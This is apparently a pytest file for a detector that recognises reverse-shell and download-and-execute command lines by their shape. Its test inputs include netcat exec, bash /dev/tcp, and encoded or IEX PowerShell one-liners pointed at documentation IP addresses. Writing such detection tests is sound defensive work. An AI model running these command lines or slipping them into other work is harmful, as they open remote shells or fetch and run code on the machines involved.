"""Universal reverse-shell / C2 command-line SHAPE detector.

The point of this detector is DETERMINISM: a literal reverse shell must confirm on
every run, not when the LLM happens to feel confident. It keys on the command-line
GRAMMAR (listen flag + remote socket, nc -e, /dev/tcp, encoded-download one-liner),
never on a binary/malware NAME -- so it generalises to a held-out box.

Metamorphic invariance is the universality proof: relabel the IP / port / key literals
and the verdict is UNCHANGED, because the values are never matched -- only the shape.
All literals below are synthetic (RFC-5737 documentation IPs); no case IOC is hardcoded.
"""
from sift_sentinel.analysis.reverse_shell_cmdline import (
    is_reverse_shell_shape,
    score_reverse_shell_cmdline,
)


# ---- positive: a reverse-shell implant shape (listen flag + remote socket) ----
IMPLANT = "-l 4444 -s 203.0.113.7:1337 -k a1b2c3d4"


def test_implant_shape_is_reverse_shell():
    assert is_reverse_shell_shape(IMPLANT) is True


def test_metamorphic_relabel_values_unchanged():
    # Relabel every literal (port, IP, key). Shape identical -> verdict identical.
    relabelled = "-l 9999 -s 198.51.100.9:51000 -k zzzzzzzz"
    assert is_reverse_shell_shape(relabelled) is True
    # and a totally different value set, same grammar (single-digit port too)
    assert is_reverse_shell_shape("-l 1 -s 192.0.2.8:65000 -k 0") is True


def test_netcat_exec_redirection_is_reverse_shell():
    assert is_reverse_shell_shape("nc -e /bin/sh 203.0.113.5 4444") is True
    assert is_reverse_shell_shape("ncat --exec cmd.exe 198.51.100.9 9001") is True


def test_dev_tcp_bash_reverse_shell():
    assert is_reverse_shell_shape("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1") is True


def test_encoded_powershell_download_oneliner():
    cmd = ("powershell.exe -nop -w hidden -enc "
           "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")
    assert is_reverse_shell_shape(cmd) is True
    plain = "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('x')\""
    assert is_reverse_shell_shape(plain) is True


def test_argv_list_input_is_normalised():
    assert is_reverse_shell_shape(["net_helper.exe", "-l", "4444",
                                   "-s", "203.0.113.7:1337", "-k", "1"]) is True


# ---- negative: benign shapes that must NOT be confirm-graded by shape alone ----
def test_bare_remote_endpoint_alone_is_not_confirm_grade():
    # a DB / monitoring client that merely connects to a host:port is NOT a shell
    assert is_reverse_shell_shape("myapp.exe --server 203.0.113.5:5432 --pool 8") is False


def test_plain_listener_alone_is_not_confirm_grade():
    # a server that only listens (no remote endpoint, no exec idiom) is not a reverse shell
    assert is_reverse_shell_shape("webserver --listen 8080 --root /var/www") is False


def test_ordinary_cmdline_is_not_reverse_shell():
    assert is_reverse_shell_shape("C:\\Windows\\System32\\svchost.exe -k netsvcs") is False
    assert is_reverse_shell_shape("notepad.exe report.txt") is False


def test_empty_or_none_is_safe_false():
    assert is_reverse_shell_shape(None) is False
    assert is_reverse_shell_shape("") is False
    assert is_reverse_shell_shape([]) is False


# ---- scoring: more idioms -> higher score, signals are named structurally ----
def test_score_returns_named_structural_signals():
    res = score_reverse_shell_cmdline(IMPLANT)
    assert res["score"] > 0
    assert isinstance(res["signals"], list) and res["signals"]
    # signals are structural names, never a case value (no IP / port literal in them)
    joined = " ".join(res["signals"])
    assert "203.0.113" not in joined and "1337" not in joined


def test_strong_idiom_outscores_weak_combo():
    strong = score_reverse_shell_cmdline("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1")["score"]
    weak = score_reverse_shell_cmdline("myapp --server 203.0.113.5:5432")["score"]
    assert strong > weak
